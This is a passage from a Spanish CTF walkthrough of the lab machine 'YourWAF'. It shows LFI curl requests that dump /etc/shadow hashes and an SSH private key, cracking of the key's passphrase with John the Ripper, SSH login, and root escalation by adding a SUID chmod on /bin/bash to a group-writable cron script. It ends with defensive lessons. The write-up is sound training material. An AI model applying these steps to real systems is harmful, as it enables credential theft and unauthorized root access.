**El filtro:** Solo bloquea si la cadena `passwd` aparece en el parámetro `file`. **No bloquea** `shadow`, `id_rsa`, `authorized_keys`, ni ningún otro archivo crítico.

**Explotación:**

- **Leer `/etc/passwd` (bloqueado):**

```bash
curl -s "http://www.yourwaf.nyx:3000/readfile?api-token=$TOKEN&file=/../../../etc/passwd"
```

```
ForbiddenError: Forbidden
```

- **Leer `/etc/shadow` (permitido):**

```bash
curl -s "http://www.yourwaf.nyx:3000/readfile?api-token=$TOKEN&file=/../../../etc/shadow"
```

**Resultado:**

```
root:$y$j9T$JH/CzJmRDacbsbjgWUdU31$81z3Ts0yjD0/FKq0kaMfH1Nv6tOVnGzaWORsKOASgcD:19869:0:99999:7:::
daemon:*:19857:0:99999:7:::
bin:*:19857:0:99999:7:::
sys:*:19857:0:99999:7:::
sync:*:19857:0:99999:7:::
games:*:19857:0:99999:7:::
man:*:19857:0:99999:7:::
lp:*:19857:0:99999:7:::
mail:*:19857:0:99999:7:::
news:*:19857:0:99999:7:::
uucp:*:19857:0:99999:7:::
proxy:*:19857:0:99999:7:::
www-data:*:19857:0:99999:7:::
backup:*:19857:0:99999:7:::
list:*:19857:0:99999:7:::
irc:*:19857:0:99999:7:::
_apt:*:19857:0:99999:7:::
nobody:*:19857:0:99999:7:::
systemd-network:!*:19857::::::
systemd-timesync:!*:19857::::::
messagebus:!:19857::::::
tester:$y$j9T$Yfz63V2R44.PCc9w5EbOY.$yqfbdE7ZYDN/hQs/fESz.vfAPFuYVvpR0Fw0NgPEzl3:19869:0:99999:7:::
mysql:!:19857::::::
sshd:!:19860::::::
```

**Nota:** El proyecto Node.js corre como `root`, lo que permite leer el archivo `/etc/shadow`.

---

## Fase 11: Crackeo de hashes

### 11.1 Intento de crackeo de `/etc/shadow`

Guardamos los hashes en un archivo:

```bash
cat hash.txt 
tester:$y$j9T$Yfz63V2R44.PCc9w5EbOY.$yqfbdE7ZYDN/hQs/fESz.vfAPFuYVvpR0Fw0NgPEzl3
root:$y$j9T$JH/CzJmRDacbsbjgWUdU31$81z3Ts0yjD0/FKq0kaMfH1Nv6tOVnGzaWORsKOASgcD
```

Intentamos crackearlos con John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 DONE (2026-09-16 21:40) 0g/s 3613Kp/s 3613Kc/s 3613KC/s !SkicA!..*7¡Vamos!
Session completed.
```

```bash
john --show hash.txt
```

```
0 password hashes cracked, 1 left
```

**Explicación:** Los hashes son de tipo **yescrypt** (`$y$`), un algoritmo moderno y resistente a GPU, lo que hace muy difícil su crackeo con `rockyou.txt`.

### 11.2 Lectura de la clave privada SSH de `tester`

Como no pudimos crackear los hashes, intentamos leer la clave privada SSH del usuario `tester` mediante el LFI (recordemos que el filtro solo bloquea `passwd`):

```bash
curl -s "http://www.yourwaf.nyx:3000/readfile?api-token=$TOKEN&file=/../../../home/tester/.ssh/id_rsa"
```

**Resultado:**

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAvW8wAqH
SLn2V7E+nYS3uZAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDKnSmNEg5m
...............................................................................................................................................................................
qPOV9nfgRtlIkNVfAwx4exAh0yqzSEjhda3nzUyrNcQ7xgWPgC0owqjTEK5D5qzsFX6Qsx
LKwitLQRMXIAV0bw/huDqpR//rKczkaylAasaNH5i2eNQzWkUShk5soGevSZCM0ULQuIBZ
3WU8UsbKGBUjj+hR+HDwlDQo44S2zRTy0A92Cum9ycrKXyjahXC3aBNS4PT+KBvLRuXGvm
NOmwKPWS5rqFofpdCmmz/n4nRNM=
-----END OPENSSH PRIVATE KEY-----
```

La clave privada está protegida con una passphrase.

### 11.3 Crackeo de la passphrase de la clave SSH

Guardamos la clave en un archivo `id_rsa` y usamos `ssh2john.py` para extraer el hash:

```bash
/usr/share/john/ssh2john.py id_rsa > ssh_hash.txt
```

**Verificación de archivos:**

```bash
ls
hash.txt  id_rsa  rev.sh  ssh_hash.txt
```

Crackeamos la passphrase con John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

**Resultado:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wafako           (id_rsa)     
1g 0:00:07:05 DONE (2026-09-16 22:24) 0.002349g/s 21.53p/s 21.53c/s 21.53C/s okokok..pajarito
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La passphrase es **`wafako`**.

---

## Fase 12: Acceso SSH como `tester`

### 12.1 Conexión SSH

```bash
ssh tester@yourwaf.nyx -i id_rsa
```

**Resultado:**

```
The authenticity of host 'yourwaf.nyx (192.168.1.5)' can't be established.
ED25519 key fingerprint is SHA256:eKRJF+CABz8MdYZ7eyYpm78vY3ESlPqogjwfmF6ZOXk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'yourwaf.nyx' (192.168.1.5) to the list of known hosts.
Enter passphrase for key 'id_rsa': wafako
```

```bash
tester@yourwaf:~$ id
uid=1000(tester) gid=1000(tester) grupos=1000(tester),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1001(copylogs)
```

**Observación clave:** El usuario `tester` pertenece al grupo **`copylogs`** (GID 1001).

### 12.2 Obtención de la flag de usuario

```bash
tester@yourwaf:~$ ls
user-afa83c8bac2338a439766f22e8245636.txt
tester@yourwaf:~$ cat user-afa83c8bac2338a439766f22e8245636.txt
[REDACTED]
```

Obtenemos la **flag de usuario**.

---

## Fase 13: Escalada a root

### 13.1 Enumeración de archivos del grupo `copylogs`

Buscamos archivos que pertenezcan al grupo `copylogs`:

```bash
find / -group copylogs 2>/dev/null
```

**Resultado:**

```
/opt/nodeapp/copylogs.sh
```

### 13.2 Análisis del script `copylogs.sh`

```bash
ls -la /opt/nodeapp/
```

**Resultado:**

```
total 60
drwxr-xr-x  4 root root      4096 may 26  2024 .
drwxr-xr-x  3 root root      4096 may 26  2024 ..
-rwxrwxr-x  1 root copylogs   111 may 26  2024 copylogs.sh
```

**Observación:** El script es **escribible por el grupo `copylogs`** (`-rwxrwxr-x`). `tester` pertenece a este grupo, por lo que puede modificar el script.

```bash
cat /opt/nodeapp/copylogs.sh
```

**Contenido original:**

```bash
#!/bin/bash

# Copia de logs de modsecurity cada 10 sec

cp /var/log/apache2/modsec_audit.log /opt/nodeapp/logs
```

### 13.3 Verificación del bit SUID de `/bin/bash` (antes)

```bash
ls -la /bin/bash
```

**Resultado:**

```
-rwxr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```

No tiene el bit SUID activado.

### 13.4 Modificación del script para escalar privilegios

Como `tester` puede escribir en `copylogs.sh`, modificamos el script para que añada el bit SUID a `/bin/bash`:

```bash
cat > /opt/nodeapp/copylogs.sh <<'EOF'
#!/bin/bash

# Copia de logs de modsecurity cada 10 sec
cp /var/log/apache2/modsec_audit.log /opt/nodeapp/logs

chmod 4755 /bin/bash
EOF
```

**Explicación:** El script es ejecutado por `root` (a través del cron job). Al añadir `chmod 4755 /bin/bash`, le otorgamos el bit **SUID** a `/bin/bash`, lo que significa que cuando cualquier usuario ejecute `/bin/bash`, se ejecutará con los privilegios del propietario (`root`).

### 13.5 Espera de la ejecución del cron job

Esperamos a que el cron job se ejecute y verificamos que el bit SUID se haya aplicado:

```bash
ls -la /bin/bash
```

**Resultado:**

```
-rwsr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```

El `s` en lugar de `x` en los permisos del propietario indica que el bit SUID está activado.

### 13.6 Obtención de shell root

Ejecutamos `/bin/bash` con la opción `-p` (preserva los privilegios):

```bash
/bin/bash -p
```

**Resultado:**

```bash
bash-5.2# id
uid=1000(tester) gid=1000(tester) euid=0(root) grupos=1000(tester),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1001(copylogs)
bash-5.2# whoami
root
```

Obtenemos una shell como **root**.

---

## 📌 Conclusión

YourWAF es una máquina **Fácil** que combina:

1. **Descubrimiento de red** con `arp-scan` y escaneo de puertos con Nmap.
2. **Detección de WAF** con `wafw00f` y análisis de la configuración.
3. **Exposición de logs de ModSecurity** a través de un endpoint sin autenticación.
4. **Bypass del WAF** mediante la manipulación del User-Agent y la ofuscación de comandos con `\` + salto de línea.
5. **Enumeración de subdominios** con `ffuf` y descubrimiento de `maintenance.yourwaf.nyx`.
6. **RCE** a través del parámetro `cmd` en `index.php`.
7. **Análisis del código fuente** de `index.php` y `server.js`.
8. **Token hardcodeado** en `server.js` y **LFI** con filtro débil en `/readfile`.
9. **Lectura de `/etc/shadow`** y **clave privada SSH** de `tester`.
10. **Crackeo de la passphrase** de la clave SSH con John the Ripper.
11. **Acceso SSH** como `tester` y obtención de la flag de usuario.
12. **Escalada a root** mediante un cron job que ejecuta un script escribible por el grupo `copylogs`, que añade el bit SUID a `/bin/bash`.

---

## 📚 Lecciones aprendidas

1. **Los logs de WAF no deben exponerse públicamente**  
   El endpoint `/logs` permitía acceder a los logs de ModSecurity sin autenticación. Esto reveló la configuración exacta del WAF (versión, ruleset, paranoia level, umbral de bloqueo), lo que facilitó el diseño del bypass. Los logs deben estar protegidos por autenticación y autorización.

2. **La seguridad por oscuridad no es seguridad**  
   El WAF bloqueaba peticiones con User-Agent de escáner, pero no verificaba otros indicadores. Un atacante puede cambiar el User-Agent para evadir esta protección. Los WAF deben basarse en múltiples señales, no solo en el User-Agent.

3. **La ofuscación de comandos es efectiva contra WAFs basados en firmas**  
   La técnica de `\` + salto de línea permite dividir comandos sin que el WAF los detecte, pero el shell los interpreta correctamente. Los WAF deben normalizar las entradas antes de aplicar las reglas.

4. **La combinación de RCE y WAF débil es crítica**  
   La página `index.php` permitía ejecución de comandos a través de `system()`. El WAF era la única protección, y una vez eludido, el RCE era trivial. Las aplicaciones deben validar y sanitizar las entradas del usuario, no depender únicamente de un WAF.

5. **Los filtros débiles en LFI permiten leer archivos críticos**  
   El filtro en `/readfile` solo bloqueaba la palabra `passwd`. Esto permitió leer `/etc/shadow` y claves privadas SSH. Los filtros de LFI deben ser robustos y basados en listas blancas, no en listas negras.

6. **Las passphrases débiles son vulnerables a fuerza bruta**  
   La passphrase de la clave SSH (`wafako`) estaba en el diccionario `rockyou.txt`. Las claves privadas SSH deben estar protegidas con passphrases largas y aleatorias, o mejor aún, no almacenarse en el servidor.

7. **La enumeración de grupos y permisos es clave**  
    La pertenencia al grupo `copylogs` fue el factor decisivo para la escalada. Siempre se debe enumerar los grupos a los que pertenece el usuario y buscar archivos con permisos de escritura para esos grupos.


